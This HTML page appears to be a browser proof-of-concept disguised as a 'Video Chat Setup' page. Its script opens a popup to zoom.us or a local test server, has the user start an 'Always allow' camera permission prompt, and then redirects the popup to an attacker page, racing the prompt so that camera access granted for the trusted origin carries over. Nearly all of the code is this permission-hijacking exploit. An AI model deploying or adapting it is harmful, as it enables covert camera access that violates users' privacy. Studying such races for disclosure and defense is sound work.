<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>Video Chat</title>
<style>
body{font-family:system-ui;max-width:380px;margin:40px auto;padding:20px}
h1{font-size:1.1em;margin-bottom:20px}
button{display:block;width:100%;padding:11px;margin:8px 0;font-size:14px;cursor:pointer;border:1px solid #ccc;border-radius:5px;background:#f9f9f9}
button:hover{background:#eee}
button.race{background:#c00;color:#fff;border-color:#a00}
button.check{background:#080;color:#fff;border-color:#060}
pre{background:#fafafa;border:1px solid #eee;padding:10px;font-size:11px;min-height:60px;max-height:180px;overflow:auto;white-space:pre-wrap}
</style>
</head>
<body>
<h1>Video Chat Setup</h1>
<button onclick="step1()">1. Enable Camera</button>
<button onclick="step2()">2. Open Popup</button>
<button class="race" onclick="step3()">3. Race</button>
<button class="check" onclick="step4()">4. Check</button>
<pre id="L">Ready.</pre>

<script>
var popup;
var victim = location.hostname==='127.0.0.1' ? 'http://localhost:9081' : 'https://zoom.us';
var log = function(m){ var e=document.getElementById('L'); e.textContent+=m+'\n'; try{e.scrollTop=e.scrollHeight}catch(_){} };

function step1(){
  log('Requesting camera...');
  navigator.mediaDevices.getUserMedia({video:true})
    .then(function(s){ s.getTracks().forEach(function(t){t.stop()}); log('Granted — block it for race') })
    .catch(function(e){ log('State: '+e.name) });
}

function step2(){
  popup = window.open(victim,'p','width=500,height=350');
  if(!popup){ log('Popup blocked'); return }
  log('Popup → '+victim);
  log('In popup: click blocked camera icon → select Always allow → DON\'T click Done');
}

function step3(){
  if(!popup){ log('Open popup first'); return }
  popup.location = location.origin+'/race.html';
  log('Race: popup → '+location.origin+'/race.html');
}

function step4(){
  navigator.mediaDevices.getUserMedia({video:true})
    .then(function(s){ s.getTracks().forEach(function(t){t.stop()}); log('CAMERA GRANTED — race may have worked') })
    .catch(function(e){ log('Blocked: '+e.name) });
}
</script>
</body>
</html>
